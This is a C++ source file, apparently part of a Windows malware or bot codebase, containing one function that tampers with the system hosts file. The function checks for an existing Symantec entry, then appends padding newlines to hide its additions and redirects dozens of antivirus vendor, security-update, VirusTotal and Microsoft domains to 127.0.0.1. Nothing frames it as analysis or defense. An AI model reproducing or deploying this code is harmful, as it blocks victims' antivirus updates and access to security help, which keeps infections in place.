#include "includes.h"
#include "functions.h"
#include "externs.h"

void CHOSTS::AddHosts(void) {
	// Build path to hosts file
	char szSystemDir[MAX_PATH]; GetSystemDirectory(szSystemDir, sizeof(szSystemDir));
	strncat(szSystemDir, "\\drivers\\etc\\hosts", sizeof(szSystemDir));

	// Check if host entries already exist
	FILE *fp=fopen(szSystemDir, "r"); if(fp) {
		while(fgets(szSystemDir, sizeof(szSystemDir), fp) && !feof(fp))
			if(strstr(szSystemDir, "www.symantec.com")) {
				fclose(fp); return; }
		fclose(fp); }

	// Build path to hosts file
	GetSystemDirectory(szSystemDir, sizeof(szSystemDir));
	strncat(szSystemDir, "\\drivers\\etc\\hosts", sizeof(szSystemDir));

	// Add host entries to the file
	fp=fopen(szSystemDir, "a"); if(fp) {
		fprintf(fp, "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");
		fprintf(fp, "\n127.0.0.1\twww.symantec.com\n");
		fprintf(fp, "127.0.0.1\tsecurityresponse.symantec.com\n");
		fprintf(fp, "127.0.0.1\tsymantec.com\n");
		fprintf(fp, "127.0.0.1\twww.sophos.com\n");
		fprintf(fp, "127.0.0.1\tsophos.com\n");
		fprintf(fp, "127.0.0.1\twww.mcafee.com\n");
		fprintf(fp, "127.0.0.1\tmcafee.com\n");
		fprintf(fp, "127.0.0.1\tliveupdate.symantecliveupdate.com\n");
		fprintf(fp, "127.0.0.1\twww.viruslist.com\n");
		fprintf(fp, "127.0.0.1\tviruslist.com\n");
		fprintf(fp, "127.0.0.1\tviruslist.com\n");
		fprintf(fp, "127.0.0.1\tf-secure.com\n");
		fprintf(fp, "127.0.0.1\twww.f-secure.com\n");
		fprintf(fp, "127.0.0.1\tkaspersky.com\n");
		fprintf(fp, "127.0.0.1\tkaspersky-labs.com\n");
		fprintf(fp, "127.0.0.1\twww.avp.com\n");
		fprintf(fp, "127.0.0.1\twww.kaspersky.com\n");
		fprintf(fp, "127.0.0.1\tavp.com\n");
		fprintf(fp, "127.0.0.1\twww.networkassociates.com\n");
		fprintf(fp, "127.0.0.1\tnetworkassociates.com\n");
		fprintf(fp, "127.0.0.1\twww.ca.com\n");
		fprintf(fp, "127.0.0.1\tca.com\n");
		fprintf(fp, "127.0.0.1\tmast.mcafee.com\n");
		fprintf(fp, "127.0.0.1\tmy-etrust.com\n");
		fprintf(fp, "127.0.0.1\twww.my-etrust.com\n");
		fprintf(fp, "127.0.0.1\tdownload.mcafee.com\n");
		fprintf(fp, "127.0.0.1\tdispatch.mcafee.com\n");
		fprintf(fp, "127.0.0.1\tsecure.nai.com\n");
		fprintf(fp, "127.0.0.1\tnai.com\n");
		fprintf(fp, "127.0.0.1\twww.nai.com\n");
		fprintf(fp, "127.0.0.1\tupdate.symantec.com\n");
		fprintf(fp, "127.0.0.1\tupdates.symantec.com\n");
		fprintf(fp, "127.0.0.1\tus.mcafee.com\n");
		fprintf(fp, "127.0.0.1\tliveupdate.symantec.com\n");
		fprintf(fp, "127.0.0.1\tcustomer.symantec.com\n");
		fprintf(fp, "127.0.0.1\trads.mcafee.com\n");
		fprintf(fp, "127.0.0.1\ttrendmicro.com\n");
		fprintf(fp, "127.0.0.1\tpandasoftware.com\n");
		fprintf(fp, "127.0.0.1\twww.pandasoftware.com\n");
		fprintf(fp, "127.0.0.1\twww.trendmicro.com\n");
		fprintf(fp, "127.0.0.1\twww.grisoft.com\n");
		fprintf(fp, "127.0.0.1\twww.microsoft.com\n");
		fprintf(fp, "127.0.0.1\tmicrosoft.com\n");
		fprintf(fp, "127.0.0.1\twww.virustotal.com\n");
		fprintf(fp, "127.0.0.1\tvirustotal.com\n");
		fclose(fp); }
}